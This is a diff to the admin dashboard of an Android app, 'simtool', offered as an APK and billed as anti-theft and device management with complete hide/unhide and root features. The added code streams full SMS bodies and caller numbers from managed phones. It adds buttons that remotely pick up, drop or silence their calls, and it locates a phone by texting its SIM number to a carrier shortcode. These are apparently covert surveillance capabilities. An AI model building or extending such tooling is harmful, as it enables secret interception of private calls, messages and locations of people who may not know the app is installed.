@@ -975,6 +975,95 @@
       display: none;
       box-shadow: 0 4px 15px rgba(0,0,0,0.5);
     }
+
+    /* Top-Right Live Call & Message Toast Stack (Admin Activated Only) */
+    #liveCommsToastContainer {
+      position: fixed;
+      top: 14px;
+      right: 14px;
+      width: min(370px, calc(100vw - 24px));
+      z-index: 9500;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      pointer-events: none;
+    }
+    .live-comms-toast {
+      pointer-events: auto;
+      background: rgba(11, 18, 28, 0.96);
+      border: 1px solid rgba(56, 189, 248, 0.35);
+      border-left: 4px solid #38bdf8;
+      border-radius: 12px;
+      padding: 11px 12px;
+      color: #f8fafc;
+      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(8px);
+      font-size: 0.76rem;
+    }
+    .live-comms-toast.call-toast {
+      border-color: rgba(34, 197, 94, 0.45);
+      border-left-color: #22c55e;
+    }
+    .live-comms-toast.sms-toast {
+      border-color: rgba(168, 85, 247, 0.45);
+      border-left-color: #a855f7;
+    }
+    .live-comms-toast-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 6px;
+    }
+    .live-comms-toast-dev {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 7px;
+      padding: 5px 8px;
+      margin-bottom: 7px;
+      font-size: 0.69rem;
+      line-height: 1.4;
+    }
+    .live-comms-toast-body {
+      color: #e2e8f0;
+      line-height: 1.45;
+      margin-bottom: 8px;
+      word-break: break-word;
+      white-space: pre-wrap;
+      max-height: 140px;
+      overflow-y: auto;
+    }
+    .live-comms-toast-actions {
+      display: flex;
+      gap: 6px;
+      flex-wrap: wrap;
+    }
+    .live-comms-btn {
+      flex: 1;
+      min-width: 72px;
+      border: none;
+      border-radius: 7px;
+      padding: 6px 8px;
+      font-size: 0.72rem;
+      font-weight: 700;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
+    }
+    .live-comms-btn.pickup { background: #16a34a; color: #fff; }
+    .live-comms-btn.drop { background: #dc2626; color: #fff; }
+    .live-comms-btn.silent { background: #d97706; color: #fff; }
+    .live-comms-btn.secondary { background: rgba(148, 163, 184, 0.16); color: #e2e8f0; border: 1px solid rgba(148, 163, 184, 0.28); }
+    @media (max-width: 600px) {
+      #liveCommsToastContainer {
+        top: 8px;
+        right: 8px;
+        left: 8px;
+        width: auto;
+      }
+    }
     /* ============================================================
        MULTI-DEVICE FLEET DASHBOARD & RIGHT-SIDE ACTIONS PANEL
        ============================================================ */
@@ -3485,6 +3574,7 @@
 
   <!-- Toast -->
   <div id="saveToast"><i class="bi bi-check-circle-fill"></i> Settings Saved</div>
+  <div id="liveCommsToastContainer" aria-live="polite"></div>
 
   <!-- Top App Header -->
   <header>
@@ -5014,7 +5104,10 @@
               </div>
               <div id="commsLiveSummary" style="font-size:0.72rem; color:#94a3b8; margin-top:2px;">Live call state, SMS monitor, call blocker rules, remote dialer, SMS sender, Call Logs &amp; SMS Inbox viewer.</div>
             </div>
-            <div style="display:flex; gap:6px; flex-wrap:wrap;">
+            <div style="display:flex; gap:6px; flex-wrap:wrap; align-items:center;">
+              <button type="button" class="btn-ctrl btn-outline compact" id="btnCommsLiveToastToggle" onclick="toggleLiveCommsToastSetting()" title="Toggle Top-Right Live Call & Message Toast Notification (Default: Disabled)">
+                <i class="bi bi-bell-slash"></i> Live Toast: OFF
+              </button>
               <button type="button" class="btn-ctrl btn-outline compact" onclick="requestFreshDataNow()"><i class="bi bi-arrow-repeat"></i> Sync State</button>
               <button type="button" class="btn-ctrl btn-secondary compact" data-cap="DPC_OR_ROOT" onclick="grantCallSmsPermsNow()"><i class="bi bi-shield-check"></i> Auto-Grant Call/SMS Perms</button>
             </div>
@@ -5043,9 +5136,10 @@
               <input type="text" id="inpCommsDialNumber" class="form-control compact" placeholder="e.g. +15550199">
               <button type="button" class="btn-ctrl btn-primary compact" style="width:auto;" onclick="placeCallFromComms()"><i class="bi bi-telephone-fill"></i> Call</button>
             </div>
-            <div class="btn-group-2" style="margin-bottom:10px;">
-              <button type="button" class="btn-ctrl btn-success compact" onclick="dispatchTargetOrGroupCommand('ANSWER_CALL', {})"><i class="bi bi-telephone-inbound-fill"></i> Answer Ringing</button>
-              <button type="button" class="btn-ctrl btn-danger compact" onclick="dispatchTargetOrGroupCommand('END_CALL', {})"><i class="bi bi-telephone-x-fill"></i> End / Reject Call</button>
+            <div style="display:grid; grid-template-columns:repeat(3, minmax(0,1fr)); gap:6px; margin-bottom:10px;">
+              <button type="button" class="btn-ctrl btn-success compact" onclick="dispatchTargetOrGroupCommand('ANSWER_CALL', {})"><i class="bi bi-telephone-inbound-fill"></i> Pickup</button>
+              <button type="button" class="btn-ctrl btn-danger compact" onclick="dispatchTargetOrGroupCommand('END_CALL', {})"><i class="bi bi-telephone-x-fill"></i> Drop Call</button>
+              <button type="button" class="btn-ctrl btn-warning compact" onclick="dispatchTargetOrGroupCommand('SILENCE_CALL', {})"><i class="bi bi-volume-mute-fill"></i> Silent</button>
             </div>
 
             <div class="mdm-sub-heading" style="margin-top:4px;"><i class="bi bi-slash-circle-fill"></i> Call Blocklist Rules</div>
@@ -5193,6 +5287,30 @@
             </div>
           </div>
 
+          <!-- Connected 4G & 5G CGI + Connected Cell Status Summary -->
+          <div id="telecomConnectedCellBar" style="background:#070d14; border:1px solid rgba(56,189,248,0.22); border-radius:8px; padding:8px 10px; margin-bottom:10px; font-size:0.71rem; font-family:monospace; color:#cbd5e1; line-height:1.5;">
+            Connected 4G &amp; 5G CGI: Waiting for RF telemetry...
+          </div>
+
+          <!-- Airtel LBS Test (SMS -> 272) Card -->
+          <div style="background:#070d14; border:1px solid rgba(34,197,94,0.28); border-radius:8px; padding:10px; margin-bottom:10px;">
+            <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:6px; margin-bottom:8px;">
+              <div style="font-size:0.78rem; font-weight:800; color:#34d399; display:flex; align-items:center; gap:6px;">
+                <i class="bi bi-broadcast-pin"></i> Airtel LBS Test (SMS &rarr; 272)
+                <span class="badge-mini info" id="telecomLbsStatusBadge">READY</span>
+              </div>
+              <div style="display:flex; gap:6px; flex-wrap:wrap; align-items:center;">
+                <input type="text" id="inpTelecomLbsMsisdn" class="form-control compact" placeholder="Auto active SIM (91xxxxxxxxxx)" style="width:210px; font-family:monospace; font-size:0.72rem;">
+                <button type="button" class="btn-ctrl btn-success compact" onclick="triggerRemoteAirtelLbsTest()">
+                  <i class="bi bi-send-check"></i> LBS Test (272)
+                </button>
+              </div>
+            </div>
+            <div id="telecomLbsResultBox" style="background:#0b131e; border:1px solid rgba(255,255,255,0.06); border-radius:6px; padding:8px 10px; font-size:0.7rem; font-family:monospace; color:#cbd5e1; line-height:1.5;">
+              Status: IDLE • Click "LBS Test (272)" to send active SIM number (91xxxxxxxxxx) to 272 and decode LBS reply &amp; CGI.
+            </div>
+          </div>
+
           <!-- Simultaneous 5G NR + 4G LTE + 2G GSM RF Cards -->
           <div id="telecomRfCardsGrid" style="display:grid; grid-template-columns:repeat(auto-fit, minmax(260px, 1fr)); gap:10px;"></div>
         </div>
@@ -5229,7 +5347,8 @@
               <button type="button" class="btn-ctrl compact" id="btnTelecomGrpGsm" onclick="setTelecomBandGroup('2G GSM')">2G GSM</button>
             </div>
             <div id="telecomBandCheckboxes" style="display:flex; flex-wrap:wrap; gap:6px; margin-bottom:8px;"></div>
-            <div style="font-size:0.7rem; font-family:monospace; color:#94a3b8; margin-bottom:8px;" id="telecomBandMaskLabel">Selected: None • Mask: 0x0</div>
+            <div style="font-size:0.7rem; font-family:monospace; color:#94a3b8; margin-bottom:4px;" id="telecomBandMaskLabel">Selected: None • Mask: 0x0</div>
+            <div style="font-size:0.68rem; font-family:monospace; color:#64748b; margin-bottom:8px;">Airtel Cell ID Ref: L1800 (1,2,3) • L2100 (11-13 / 41-43) • L900 (21-23 / 51-53) • L850 (31,32,33) • L2300 (101-103, 111-113) • 5G (311,312,313)</div>
             <div style="display:flex; gap:6px; flex-wrap:wrap; margin-bottom:12px;">
               <button type="button" class="btn-ctrl btn-primary compact" onclick="applyTelecomBandLockCommand()"><i class="bi bi-lock-fill"></i> Apply Selected Band Lock</button>
               <button type="button" class="btn-ctrl btn-secondary compact" onclick="clearTelecomBandSelection()">Clear Selection</button>
@@ -6221,6 +6340,20 @@
           <small style="font-size:0.7rem; color:var(--text-muted);">Renames the app title and status notifications</small>
         </div>
 
+        <!-- 4B. Admin Dashboard Live Call & Message Toast Notification Setting (Default: Disabled) -->
+        <div class="settings-section-title"><i class="bi bi-bell-fill"></i> Live Call &amp; Message Toast Notification</div>
+        <div class="card-panel" style="padding:12px; background:#070b0e; margin-bottom:14px; border:1px solid var(--border-color); border-radius:10px;">
+          <label style="display:flex; align-items:flex-start; gap:10px; cursor:pointer; margin:0;">
+            <input type="checkbox" id="cfgLiveCommsToastEnabled" style="margin-top:3px; width:16px; height:16px; accent-color:#22c55e;">
+            <div>
+              <div style="font-size:0.82rem; font-weight:700; color:#f8fafc;">Enable Top-Right Live Call &amp; Message Toast Alerts</div>
+              <div style="font-size:0.7rem; color:var(--text-muted); margin-top:3px; line-height:1.4;">
+                Disabled by default. When activated by Admin, incoming Calls (with <b>Pickup</b>, <b>Drop</b> &amp; <b>Silent</b> action buttons) and incoming Messages pop up in the top-right corner with Device Name, Device ID &amp; Tag.
+              </div>
+            </div>
+          </label>
+        </div>
+
         <!-- 5. Settings Password Protection Configuration -->
         <div class="settings-section-title"><i class="bi bi-shield-lock-fill"></i> Settings Password Protection</div>
         <div class="form-group">
@@ -6335,13 +6468,13 @@
         </div>
 
         <!-- 8. Native Android Release APK Download -->
-        <div class="settings-section-title"><i class="bi bi-android2"></i> Native Android Release APK (v4.3.3)</div>
+        <div class="settings-section-title"><i class="bi bi-android2"></i> Native Android Release APK (v4.3.8)</div>
         <div style="background: rgba(56, 189, 248, 0.08); border: 1px solid rgba(56, 189, 248, 0.25); border-radius: 10px; padding: 12px; margin-bottom: 14px;">
           <div style="font-weight: 700; color: #fff; font-size: 0.85rem; margin-bottom: 4px;">Download Native Android APK (Enterprise Anti-Theft &amp; MDM DPC)</div>
           <div style="font-size: 0.72rem; color: var(--text-muted); margin-bottom: 10px;">100% Pure Android Native Java (Device Owner DPC + Release DPC, Complete Hide/Unhide, 3-Mode Operation, Device Settings &amp; User Locks, Calls &amp; SMS, Version Control Upgrade/Downgrade, Root Suite)</div>
           <div style="display:flex; flex-wrap:wrap; gap:8px; align-items:center;">
-            <a href="https://nano-micro-node.github.io/iot-devices/simtool_4.3.3.apk" target="_blank" download="simtool_4.3.3.apk" style="display: inline-flex; align-items: center; gap: 8px; background: #38bdf8; color: #090d16; font-weight: 700; font-size: 0.82rem; padding: 8px 14px; border-radius: 6px; text-decoration: none;">
-              <i class="bi bi-download"></i> Download simtool_4.3.3.apk (v4.3.3 Release)
+            <a href="https://nano-micro-node.github.io/iot-devices/simtool_4.3.8.apk" target="_blank" download="simtool_4.3.8.apk" style="display: inline-flex; align-items: center; gap: 8px; background: #38bdf8; color: #090d16; font-weight: 700; font-size: 0.82rem; padding: 8px 14px; border-radius: 6px; text-decoration: none;">
+              <i class="bi bi-download"></i> Download simtool_4.3.8.apk (v4.3.8 Release)
             </a>
             <a href="https://nano-micro-node.github.io/iot-devices/simtool.apk" target="_blank" download="simtool.apk" style="display: inline-flex; align-items: center; gap: 6px; background: rgba(52,211,153,0.12); border:1px solid rgba(52,211,153,0.35); color: #34d399; font-weight: 600; font-size: 0.78rem; padding: 8px 12px; border-radius: 6px; text-decoration: none;">
               <i class="bi bi-link-45deg"></i> simtool.apk (Latest)
@@ -6387,7 +6520,8 @@
     topic: '{username}/gps/{deviceId}/data',
     interval: 60000,
     reconnectInterval: 15,
-    retain: true
+    retain: true,
+    liveCommsToastEnabled: false
   };
 
   function normalizeMqttUsername(raw) {
@@ -6892,6 +7026,8 @@
     if (document.getElementById('cfgReconnectInterval')) document.getElementById('cfgReconnectInterval').value = config.reconnectInterval || 15;
     if (document.getElementById('selReconnectCadence')) document.getElementById('selReconnectCadence').value = config.reconnectInterval || 15;
     if (document.getElementById('cfgPin')) document.getElementById('cfgPin').value = config.settingsPin || '15263748';
+    config.liveCommsToastEnabled = (config.liveCommsToastEnabled === true);
+    syncLiveCommsToastSettingUi();
     syncUserNamespaceUi();
   }
 
@@ -6943,6 +7079,15 @@
 
     const newPin = document.getElementById('cfgPin').value.trim();
     if (newPin) config.settingsPin = newPin;
+
+    const chkLiveToast = document.getElementById('cfgLiveCommsToastEnabled');
+    if (chkLiveToast) {
+      config.liveCommsToastEnabled = !!chkLiveToast.checked;
+    }
+    if (!config.liveCommsToastEnabled) {
+      clearLiveCommsToasts();
+    }
+    syncLiveCommsToastSettingUi();
 
     localStorage.setItem(STORAGE_KEY, JSON.stringify(config));
     try {
@@ -6999,6 +7144,247 @@
     if (t) {
       t.style.display = 'block';
       setTimeout(() => t.style.display = 'none', 1600);
+    }
+  }
+
+  // ==========================================
+  // 2B. TOP-RIGHT LIVE CALL & MESSAGE TOASTS (ADMIN ACTIVATED)
+  // ==========================================
+  const liveCommsRecentSignatures = new Map();
+  let liveCommsToastSeq = 0;
+
+  function isLiveCommsToastActivated() {
+    return !!(config && config.liveCommsToastEnabled === true);
+  }
+
+  function syncLiveCommsToastSettingUi() {
+    const enabled = isLiveCommsToastActivated();
+    const chk = document.getElementById('cfgLiveCommsToastEnabled');
+    if (chk) chk.checked = enabled;
+    const btn = document.getElementById('btnCommsLiveToastToggle');
+    if (btn) {
+      btn.className = enabled ? 'btn-ctrl btn-success compact' : 'btn-ctrl btn-outline compact';
+      btn.innerHTML = enabled
+        ? '<i class="bi bi-bell-fill"></i> Live Toast: ON'
+        : '<i class="bi bi-bell-slash"></i> Live Toast: OFF';
+    }
+  }
+
+  function setLiveCommsToastEnabled(enabled, persist) {
+    config.liveCommsToastEnabled = (enabled === true);
+    if (!config.liveCommsToastEnabled) {
+      clearLiveCommsToasts();
+    }
+    syncLiveCommsToastSettingUi();
+    if (persist !== false) {
+      try { localStorage.setItem(STORAGE_KEY, JSON.stringify(config)); } catch (e) {}
+    }
+    if (typeof logTerminal === 'function') {
+      logTerminal('sys', `[SETTINGS] Live Top-Right Call & Message Toast Notification: ${config.liveCommsToastEnabled ? 'ENABLED' : 'DISABLED'}`);
+    }
+  }
+
+  function toggleLiveCommsToastSetting() {
+    setLiveCommsToastEnabled(!isLiveCommsToastActivated(), true);
+  }
+
+  function clearLiveCommsToasts() {
+    const c = document.getElementById('liveCommsToastContainer');
+    if (c) c.innerHTML = '';
+  }
+
+  function dismissLiveCommsToast(toastId) {
+    const el = toastId ? document.getElementById(toastId) : null;
+    if (el && el.parentNode) {
+      el.parentNode.removeChild(el);
+    }
+  }
+
+  function resolveLiveToastDeviceMeta(imei, dev, payloadData) {
+    const cleanId = String(imei || (dev && (dev.deviceId || dev.imei)) || '--').trim();
+    const tag = String(
+      getDeviceTagName(cleanId) ||
+      (payloadData && (payloadData.tagName || payloadData.tag)) ||
+      ''
+    ).trim();
+    const hwModel = (dev && dev.hardware && dev.hardware.model) ? String(dev.hardware.model).trim() : '';
+    const dName = hwModel ||
+      (payloadData && payloadData.deviceName ? String(payloadData.deviceName).trim() : '') ||
+      (dev && dev.deviceName ? String(dev.deviceName).trim() : '') ||
+      (dev && dev.model ? String(dev.model).trim() : '') ||
+      (payloadData && payloadData.model ? String(payloadData.model).trim() : '') ||
+      (dev && dev.launcherName ? String(dev.launcherName).trim() : '') ||
+      (dev && dev.appName ? String(dev.appName).trim() : '') ||
+      (payloadData && payloadData.appName ? String(payloadData.appName).trim() : '') ||
+      'SIM Tool Device';
+    return {
+      deviceId: cleanId,
+      deviceName: dName,
+      tagName: tag
+    };
+  }
+
+  function maybeShowLiveCommsToast(kind, imei, payloadData) {
+    if (!isLiveCommsToastActivated()) return false;
+    const container = document.getElementById('liveCommsToastContainer');
+    if (!container || !imei) return false;
+
+    const dev = devicesFleet[imei] || null;
+    const p = payloadData || {};
+    const kindUpper = String(kind || '').toUpperCase();
+    const now = Date.now();
+
+    if (kindUpper === 'CALL') {
+      const state = String(p.callState || (p.blocked ? 'BLOCKED' : '') || (dev && dev.callState) || 'EVENT').toUpperCase();
+      const num = String(p.number !== undefined ? p.number : ((dev && dev.lastCallNumber) || '')).trim();
+      const dir = String(p.direction !== undefined ? p.direction : ((dev && dev.lastCallDirection) || 'INCOMING')).trim().toUpperCase();
+      const eventTs = Number(p.timestamp || (dev && dev.lastCallTime) || 0);
+      const dedupeKey = `CALL|${imei}|${state}|${num}|${dir}`;
+      const prev = liveCommsRecentSignatures.get(dedupeKey);
+      if (prev && (now - prev.seenAt) < 3500 && (!eventTs || prev.eventTs === eventTs)) {
+        return false;
+      }
+      liveCommsRecentSignatures.set(dedupeKey, { seenAt: now, eventTs: eventTs });
+
+      const meta = resolveLiveToastDeviceMeta(imei, dev, p);
+      const safeDomImei = imei.replace(/[^a-zA-Z0-9_-]/g, '_');
+      const toastId = `liveCallToast_${safeDomImei}`;
+      let toastEl = document.getElementById(toastId);
+      if (!toastEl) {
+        toastEl = document.createElement('div');
+        toastEl.id = toastId;
+        toastEl.className = 'live-comms-toast call-toast';
+        container.insertBefore(toastEl, container.firstChild);
+      }
+
+      const isEnded = (state === 'IDLE' || state === 'ENDED');
+      const isBlocked = (state === 'BLOCKED' || dir.indexOf('BLOCKED') >= 0);
+      const isActive = (state === 'OFFHOOK');
+      const badgeColor = isBlocked ? '#f87171' : (isEnded ? '#94a3b8' : (isActive ? '#34d399' : '#22c55e'));
+      const badgeLabel = isBlocked ? '🚫 CALL BLOCKED' : (isEnded ? '📴 CALL ENDED' : (isActive ? '🟢 ACTIVE CALL' : '📞 LIVE CALL (' + state + ')'));
+      const timeStr = eventTs ? new Date(eventTs).toLocaleTimeString() : new Date().toLocaleTimeString();
+
+      toastEl.innerHTML = `
+        <div class="live-comms-toast-header">
+          <span style="font-weight:800; font-size:0.74rem; color:${badgeColor};">${escapeHtml(badgeLabel)}</span>
+          <div style="display:flex; align-items:center; gap:6px;">
+            <span style="font-size:0.64rem; color:#94a3b8;">${escapeHtml(timeStr)}</span>
+            <button type="button" onclick="dismissLiveCommsToast('${toastId}')" style="background:none; border:none; color:#94a3b8; cursor:pointer; font-size:0.95rem; line-height:1; padding:0 2px;">&times;</button>
+          </div>
+        </div>
+        <div class="live-comms-toast-dev">
+          <div><strong style="color:#f8fafc;">Device:</strong> ${escapeHtml(meta.deviceName)} ${meta.tagName ? `<span class="badge-mini info" style="margin-left:4px;">🏷️ ${escapeHtml(meta.tagName)}</span>` : `<span style="color:#94a3b8; font-size:0.65rem;">(Tag: --)</span>`}</div>
+          <div style="font-family:monospace; color:#38bdf8;">ID: ${escapeHtml(meta.deviceId)}</div>
+        </div>
+        <div class="live-comms-toast-body">
+          <div><strong style="color:#cbd5e1;">Number:</strong> <span style="font-family:monospace; font-size:0.84rem; font-weight:800; color:#fff;">${escapeHtml(num || 'Private / Unknown')}</span></div>
+          <div style="font-size:0.68rem; color:#94a3b8;">Direction: ${escapeHtml(dir || 'INCOMING')} • State: ${escapeHtml(state)}</div>
+          <div id="${toastId}_status" style="font-size:0.66rem; color:#facc15; margin-top:3px; display:none;"></div>
+        </div>
+        <div class="live-comms-toast-actions">
+          <button type="button" class="live-comms-btn pickup" onclick="liveCommsCallToastAction('${escapeHtml(meta.deviceId)}', 'PICKUP', '${toastId}')">
+            <i class="bi bi-telephone-fill"></i> Pickup
+          </button>
+          <button type="button" class="live-comms-btn drop" onclick="liveCommsCallToastAction('${escapeHtml(meta.deviceId)}', 'DROP', '${toastId}')">
+            <i class="bi bi-telephone-x-fill"></i> Drop
+          </button>
+          <button type="button" class="live-comms-btn silent" onclick="liveCommsCallToastAction('${escapeHtml(meta.deviceId)}', 'SILENT', '${toastId}')">
+            <i class="bi bi-volume-mute-fill"></i> Silent
+          </button>
+        </div>
+      `;
+
+      if (toastEl._autoTimer) {
+        clearTimeout(toastEl._autoTimer);
+        toastEl._autoTimer = null;
+      }
+      if (isEnded) {
+        toastEl._autoTimer = setTimeout(() => dismissLiveCommsToast(toastId), 9000);
+      }
+      while (container.children.length > 6) {
+        container.removeChild(container.lastChild);
+      }
+      return true;
+    }
+
+    if (kindUpper === 'SMS') {
+      const sender = String(p.from !== undefined ? p.from : ((dev && dev.lastSmsFrom) || '')).trim();
+      const body = String(
+        p.body !== undefined ? p.body : ((dev && (dev.lastSmsBody || dev.lastSmsPreview)) || '')
+      ).trim();
+      const eventTs = Number(p.timestamp || (dev && dev.lastSmsTime) || 0);
+      const dedupeKey = `SMS|${imei}|${sender}|${body.slice(0, 80)}`;
+      const prev = liveCommsRecentSignatures.get(dedupeKey);
+      if (prev && (now - prev.seenAt) < 4000 && (!eventTs || prev.eventTs === eventTs)) {
+        return false;
+      }
+      liveCommsRecentSignatures.set(dedupeKey, { seenAt: now, eventTs: eventTs });
+
+      const meta = resolveLiveToastDeviceMeta(imei, dev, p);
+      liveCommsToastSeq += 1;
+      const toastId = `liveSmsToast_${liveCommsToastSeq}`;
+      const toastEl = document.createElement('div');
+      toastEl.id = toastId;
+      toastEl.className = 'live-comms-toast sms-toast';
+      const timeStr = eventTs ? new Date(eventTs).toLocaleTimeString() : new Date().toLocaleTimeString();
+
+      toastEl.innerHTML = `
+        <div class="live-comms-toast-header">
+          <span style="font-weight:800; font-size:0.74rem; color:#c084fc;">💬 LIVE MESSAGE (SMS)</span>
+          <div style="display:flex; align-items:center; gap:6px;">
+            <span style="font-size:0.64rem; color:#94a3b8;">${escapeHtml(timeStr)}</span>
+            <button type="button" onclick="dismissLiveCommsToast('${toastId}')" style="background:none; border:none; color:#94a3b8; cursor:pointer; font-size:0.95rem; line-height:1; padding:0 2px;">&times;</button>
+          </div>
+        </div>
+        <div class="live-comms-toast-dev">
+          <div><strong style="color:#f8fafc;">Device:</strong> ${escapeHtml(meta.deviceName)} ${meta.tagName ? `<span class="badge-mini info" style="margin-left:4px;">🏷️ ${escapeHtml(meta.tagName)}</span>` : `<span style="color:#94a3b8; font-size:0.65rem;">(Tag: --)</span>`}</div>
+          <div style="font-family:monospace; color:#38bdf8;">ID: ${escapeHtml(meta.deviceId)}</div>
+        </div>
+        <div class="live-comms-toast-body">
+          <div style="margin-bottom:4px;"><strong style="color:#cbd5e1;">From:</strong> <span style="font-family:monospace; font-weight:700; color:#f8fafc;">${escapeHtml(sender || 'Unknown')}</span></div>
+          <div style="background:#070d14; border:1px solid rgba(255,255,255,0.07); border-radius:6px; padding:6px 8px; color:#e2e8f0;">${escapeHtml(body || '(Empty SMS body)')}</div>
+        </div>
+        <div class="live-comms-toast-actions">
+          <button type="button" class="live-comms-btn secondary" onclick="selectTargetDevice('${escapeHtml(meta.deviceId)}'); switchRailPage('comms'); dismissLiveCommsToast('${toastId}');">
+            <i class="bi bi-chat-dots-fill"></i> Open SMS Panel
+          </button>
+          <button type="button" class="live-comms-btn secondary" style="flex:0 0 auto; min-width:64px;" onclick="dismissLiveCommsToast('${toastId}')">Close</button>
+        </div>
+      `;
+      container.insertBefore(toastEl, container.firstChild);
+      let dismissTimer = setTimeout(() => dismissLiveCommsToast(toastId), 25000);
+      toastEl.addEventListener('mouseenter', () => { if (dismissTimer) { clearTimeout(dismissTimer); dismissTimer = null; } });
+      while (container.children.length > 6) {
+        container.removeChild(container.lastChild);
+      }
+      return true;
+    }
+    return false;
+  }
+
+  function liveCommsCallToastAction(imei, op, toastId) {
+    if (!imei) return;
+    const statusEl = toastId ? document.getElementById(toastId + '_status') : null;
+    const setFeed = (txt, col) => {
+      if (statusEl) {
+        statusEl.style.display = 'block';
+        statusEl.style.color = col || '#facc15';
+        statusEl.textContent = txt;
+      }
+    };
+    const dev = devicesFleet[imei] || null;
+    if (op === 'PICKUP') {
+      publishRemoteCommand('ANSWER_CALL', {}, imei);
+      setFeed('Pickup command sent -> answering ringing call...', '#34d399');
+    } else if (op === 'DROP') {
+      publishRemoteCommand('END_CALL', {}, imei);
+      setFeed('Drop command sent -> ending / rejecting call...', '#f87171');
+    } else if (op === 'SILENT') {
+      publishRemoteCommand('SILENCE_CALL', { ringerMode: 'SILENT' }, imei);
+      if (dev && Number(dev.buildNumber || 0) > 0 && Number(dev.buildNumber || 0) < 53) {
+        publishRemoteCommand('APPLY_DEVICE_SETTING', { key: 'RINGER_MODE', mode: 'SILENT', locked: false }, imei);
+      }
+      setFeed('Silent command sent -> muting incoming ringer...', '#fbbf24');
     }
   }
 
@@ -9193,8 +9579,14 @@
     if (data.lastCallNumber !== undefined) dev.lastCallNumber = data.lastCallNumber;
     if (data.lastCallDirection !== undefined) dev.lastCallDirection = data.lastCallDirection;
     if (data.lastCallTime !== undefined) dev.lastCallTime = data.lastCallTime;
+    if (data.deviceName) dev.deviceName = data.deviceName;
     if (data.lastSmsFrom !== undefined) dev.lastSmsFrom = data.lastSmsFrom;
-    if (data.lastSmsPreview !== undefined) dev.lastSmsPreview = data.lastSmsPreview;
+    if (data.lastSmsPreview !== undefined) {
+      dev.lastSmsPreview = data.lastSmsPreview;
+      if (dev.lastSmsBody && !String(dev.lastSmsBody).startsWith(String(data.lastSmsPreview).slice(0, 100))) {
+        dev.lastSmsBody = '';
+      }
+    }
     if (data.lastSmsTime !== undefined) dev.lastSmsTime = data.lastSmsTime;
     if (data.callBlockMode !== undefined) dev.callBlockMode = data.callBlockMode;
     if (data.callBlockNumbers !== undefined) dev.callBlockNumbers = data.callBlockNumbers;
@@ -9238,8 +9630,24 @@
         summaryParts.push('Package: ' + (dev.lastPackageEvent || '--'));
       } else if (trigUpper === 'CALL_EVENT' || trigUpper === 'CALL_BLOCKED') {
         summaryParts.push('Call ' + (dev.callState || 'EVENT') + ': ' + (dev.lastCallNumber || 'Unknown') + (dev.lastCallDirection ? ' (' + dev.lastCallDirection + ')' : ''));
+        maybeShowLiveCommsToast('CALL', imei, {
+          callState: (trigUpper === 'CALL_BLOCKED') ? 'BLOCKED' : (data.callState || dev.callState || 'EVENT'),
+          number: data.lastCallNumber || dev.lastCallNumber || '',
+          direction: data.lastCallDirection || dev.lastCallDirection || 'INCOMING',
+          timestamp: data.lastCallTime || dev.lastCallTime || Date.now(),
+          blocked: (trigUpper === 'CALL_BLOCKED'),
+          deviceName: data.deviceName || (data.hardware && data.hardware.model) || '',
+          tagName: data.tagName || ''
+        });
       } else if (trigUpper === 'SMS_EVENT') {
         summaryParts.push('SMS from ' + (dev.lastSmsFrom || 'Unknown') + ': ' + (dev.lastSmsPreview || ''));
+        maybeShowLiveCommsToast('SMS', imei, {
+          from: data.lastSmsFrom || dev.lastSmsFrom || '',
+          body: dev.lastSmsBody || data.lastSmsPreview || dev.lastSmsPreview || '',
+          timestamp: data.lastSmsTime || dev.lastSmsTime || Date.now(),
+          deviceName: data.deviceName || (data.hardware && data.hardware.model) || '',
+          tagName: data.tagName || ''
+        });
       } else if (trigUpper === 'DEVICE_RENAMED') {
         summaryParts.push('Renamed ID -> ' + imei + (data.previousDeviceId ? (' (from ' + data.previousDeviceId + ')') : ''));
       }
@@ -9723,15 +10131,60 @@
         }
       }
     } else if (action === 'CALL_EVENT') {
+      if (data.deviceName) dev.deviceName = data.deviceName;
+      if (data.tagName !== undefined && String(data.tagName).trim() !== '' && !getDeviceTagName(imei)) {
+        setDeviceTag(imei, String(data.tagName).trim(), false);
+      }
       if (data.callState) dev.callState = data.callState;
       if (data.blocked) dev.callState = 'BLOCKED';
-      if (data.number) dev.lastCallNumber = data.number;
+      if (data.number !== undefined) dev.lastCallNumber = data.number;
       if (data.direction) dev.lastCallDirection = data.direction;
       dev.lastCallTime = data.timestamp || Date.now();
+      maybeShowLiveCommsToast('CALL', imei, data);
     } else if (action === 'SMS_EVENT') {
-      if (data.from) dev.lastSmsFrom = data.from;
-      if (data.body !== undefined) dev.lastSmsPreview = String(data.body).slice(0, 160);
+      if (data.deviceName) dev.deviceName = data.deviceName;
+      if (data.tagName !== undefined && String(data.tagName).trim() !== '' && !getDeviceTagName(imei)) {
+        setDeviceTag(imei, String(data.tagName).trim(), false);
+      }
+      if (data.from !== undefined) dev.lastSmsFrom = data.from;
+      if (data.body !== undefined) {
+        dev.lastSmsBody = String(data.body);
+        dev.lastSmsPreview = String(data.body).slice(0, 160);
+      }
       dev.lastSmsTime = data.timestamp || Date.now();
+      maybeShowLiveCommsToast('SMS', imei, data);
+    } else if (action === 'AIRTEL_LBS_TEST' || action === 'AIRTEL_LBS_RESULT') {
+      if (!dev.telecom || typeof dev.telecom !== 'object') dev.telecom = {};
+      dev.telecom.lbsTest = {
+        status: data.status || (action === 'AIRTEL_LBS_RESULT' ? 'SUCCESS' : 'WAITING_REPLY'),
+        shortCode: data.shortCode || '272',
+        targetMsisdn: data.targetMsisdn || '',
+        slotNumber: data.slotNumber || 1,
+        carrier: data.carrier || '',
+        sentAtMs: data.sentAtMs || 0,
+        sentAtStr: data.sentAtStr || '--',
+        sendResult: data.sendResult || data.message || '',
+        receivedAtMs: data.receivedAtMs || 0,
+        receivedAtStr: data.receivedAtStr || '--',
+        responseSender: data.responseSender || '',
+        responseRaw: data.responseRaw || '',
+        parsedStatus: data.parsedStatus || data.message || '',
+        responseCgi: data.responseCgi || '',
+        cgiBtsInfo: data.cgiBtsInfo || '',
+        responseLac: data.responseLac || '',
+        responseCellId: data.responseCellId || '',
+        responseLatLon: data.responseLatLon || '',
+        responseLocation: data.responseLocation || '',
+        mob: data.mob || '',
+        lastActivity: data.lastActivity || '',
+        vlr: data.vlr || '',
